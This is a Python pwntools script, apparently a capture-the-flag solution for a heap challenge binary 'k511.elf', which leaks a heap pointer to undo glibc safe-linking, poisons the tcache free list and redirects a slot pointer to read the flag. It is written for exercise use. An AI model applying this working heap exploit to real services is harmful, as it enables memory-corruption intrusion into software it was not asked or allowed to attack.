import argparse
import pwn
import os

# The binary will read the FLAG environment variable to set the flag into memory
os.environ['FLAG'] = 'srdnlen{fake_flag}'

# Options to set when run against the remote server
parser = argparse.ArgumentParser()
parser.add_argument('-r', action='store_true', help="Run script against a remote server")
parser.add_argument('-i', '--ip', type=str, help="IP address of remote server", default=None)
parser.add_argument('-p', '--port', type=int, help="Port of remote server", default=None)

args = parser.parse_args()

file = "./k511.elf"

if args.r:
    conn = pwn.remote(args.ip, args.port)
else:
    conn = pwn.process(file)

def create_memory(txt):
    conn.send(b'1\n')
    conn.recvuntil(b'\n')
    conn.send(txt)
    conn.recvuntil(b'\n\n')

def read_memory(slot):
    conn.send(b'2\n')
    conn.recvuntil(b'\n')
    conn.send(slot)
    r = conn.recvuntil(b'\n\n')
    return r.split(b'"')[1]

def erase_memory(slot):
    conn.send(b'3\n')
    conn.recvuntil(b'\n')
    conn.send(slot)
    conn.recvuntil(b'\n\n')

r = conn.recvuntil(b'Quit.\n\n')

for i in range(9):
    create_memory(b'txt\n')

erase_memory(b'9\n')
erase_memory(b'8\n')
erase_memory(b'7\n')
erase_memory(b'6\n')
erase_memory(b'5\n')
erase_memory(b'1\n')
erase_memory(b'3\n')
erase_memory(b'4\n')
erase_memory(b'2\n')

create_memory(b'txt\n')

a4 = read_memory(b'4\n')
a2 = read_memory(b'2\n')

base_address = bytes(reversed(a4)).hex()
protected_address = bytes(reversed(a2)).hex()
unprotected_address = hex(int(base_address, 16) ^ int(protected_address, 16))[2:]
print("Protected = 0x" + protected_address)
print("Unprotected = 0x" + unprotected_address)

flag_address = hex(int(unprotected_address, 16) - 160)[2:]
print("Flag = 0x" + flag_address)

slot_zero_address = hex(int(unprotected_address, 16)-304)[2:]
print("Slot 0 address = 0x" + slot_zero_address)

slot_zero_address = hex(int(unprotected_address, 16)-304)[2:]
print("Slot 0 address = 0x" + slot_zero_address)
protected_slot_zero_address = hex(int(base_address, 16) ^ int(slot_zero_address, 16))[2:]
print("Slot 0 protected address = 0x" + protected_slot_zero_address)

erase_memory(b'1\n')
erase_memory(b'4\n')

# Remove all the chunks in the tcachelist
for i in range(7):
    create_memory(b'txt\n')

# Put the protected address to the slot 0 in the bin
create_memory(bytes(reversed(bytes.fromhex(protected_slot_zero_address))) + b'\x00\n')

create_memory(b'txt\n')
create_memory(b'txt\n')
create_memory(b'A'*8 + bytes(reversed(bytes.fromhex(flag_address))) + b'\x00\n')

r = read_memory(b'1\n')
print(b'flag: ' + r)